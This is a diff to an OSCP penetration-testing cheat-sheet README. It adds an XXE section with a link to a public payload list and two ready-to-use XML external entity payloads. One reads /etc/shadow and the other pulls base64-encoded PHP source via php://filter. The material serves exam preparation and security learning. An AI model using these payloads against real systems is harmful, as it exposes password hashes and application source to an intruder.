@@ -92,6 +92,10 @@ This repository describes cheat sheet and knowledge for OSCP.
 - [Aggregating Sensitive Information](#aggregating-sensitive-information)
   - [truffleHog](#trufflehog)
     - [Scan GitHub](#scan-github)
+- [XXE](#xxe)
+  - [Payloads](#payloads)
+  - [LFI by XXE](#lfi-by-xxe)
+  - [Get PHP file by XXE](#get-php-file-by-xxe)
 - [Fuzz](#fuzz)
   - [ffuf](#ffuf)
     - [Basic usage](#basic-usage)
@@ -613,6 +617,33 @@ Docker
 docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo <Repository URL></Repository>
 ```
 
+# XXE
+## Payloads
+https://github.com/payloadbox/xxe-injection-payload-list
+
+## LFI by XXE
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&ent;</lastName>
+</userInfo>
+```
+## Get PHP file by XXE
+
+```
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <address>42 rue du CTF</address>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+```
 # Fuzz
 ## ffuf
 ### Basic usage
